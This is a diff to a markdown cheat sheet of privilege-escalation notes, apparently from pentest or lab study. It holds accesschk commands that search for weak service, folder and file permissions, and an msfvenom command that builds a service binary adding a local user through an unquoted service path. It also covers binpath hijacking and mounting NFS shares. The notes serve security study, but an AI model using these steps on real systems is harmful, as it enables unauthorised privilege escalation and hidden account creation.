@@ -397,8 +397,24 @@ tasklist /SVC
 
 #### Services(DLL, binpath, registry, exe)
 `accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in user group
-accesschk64.exe -uwcqv "user" *
+
 `accesschk64.exe -wuvc [service]` - checks permissions on service 
+
+```
+# When executing any of the sysinternals tools for the first time the user will be presented with a GUI
+pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
+to automatically accept the EULA.
+
+accesschk.exe /accepteula ... ... ...
+
+# Find all weak folder permissions per drive.
+accesschk64.exe -uwdqs Users c:\
+accesschk64.exe -uwdqs "Authenticated Users" c:\
+
+# Find all weak file permissions per drive.
+accesschk64.exe -uwqs Users c:\*.*
+accesschk64.exe -uwqs "Authenticated Users" c:\*.*
+```
 
 ##### Finding vulnerable services(binpath)
 we're looking for services that have the SERVICE_CHANGE_CONFIG allowed for our user so that we can mess with the binpath(use resources to exploit)
@@ -427,28 +443,11 @@ i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
 
 
 ```
-
-##### Accesschk64
-```
-# When executing any of the sysinternals tools for the first time the user will be presented with a GUI
-pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
-to automatically accept the EULA.
-
-accesschk.exe /accepteula ... ... ...
-
-# Find all weak folder permissions per drive.
-accesschk64.exe -uwdqs Users c:\
-accesschk64.exe -uwdqs "Authenticated Users" c:\
-
-# Find all weak file permissions per drive.
-accesschk64.exe -uwqs Users c:\*.*
-accesschk64.exe -uwqs "Authenticated Users" c:\*.*
-```
 Example had you look for SERVICE_CHANGE_CONFIG permission for users to be writeable so we could change binpath
 
-##### Unqouted Paths
+##### Unquoted Paths
 
-`wmic service get name,pathname,startmode` - find unquoted file paths for services
+`wmic service get name,pathname,startmode` - find unquoted file paths for services and check perms on directories in path
 `msfvenom -p windows/exec CMD='net user /add qoute qoute123' -f exe-service -o common.exe` - creates binary to run in unquoted path, name of binary must be in path for this to work. then restart service
 
 ##### Registry
@@ -941,7 +940,7 @@ cat /etc/fstab
 # First check if the target machine has any NFS shares
 showmount -e 192.168.1.101
 
-# If it does, then mount it to you filesystem
+# If it does, then mount it to your filesystem
 mount 192.168.1.101:/ /tmp/
 ```
 
